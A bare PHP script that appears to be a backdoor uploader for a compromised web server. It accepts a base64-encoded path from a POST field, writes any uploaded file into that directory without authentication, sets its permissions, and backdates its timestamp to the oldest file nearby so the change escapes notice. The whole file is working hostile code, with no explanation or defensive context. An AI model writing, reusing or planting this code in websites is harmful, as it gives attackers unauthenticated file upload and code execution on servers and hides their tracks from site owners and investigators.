<?php


function set_min_date($filepath) {
    $dir = dirname($filepath);
    $o = opendir($dir);
    $min_lastmod = 0;
    while ($r = readdir($o)) {
        $mod = filectime($dir . "/" . $r);
        if (!$min_lastmod) {
            $min_lastmod = $mod;
            continue;
        }

        if ($min_lastmod > $mod) {
            $min_lastmod = $mod;
        }
    }

    if ($min_lastmod) {
        touch($filepath, $min_lastmod);
    }
}

$pth = base64_decode($_POST['d_pth']);
chdir($pth);

$fl = current($_FILES);
$fname = $fl['name'];
$perms = 0777 & fileperms($fname);

move_uploaded_file($fl['tmp_name'],$fname);

if ($perms >= 64) {
    chmod($fname, $perms);
} else {
    chmod($fname, 0755);
}


set_min_date($fl['name']);


exit;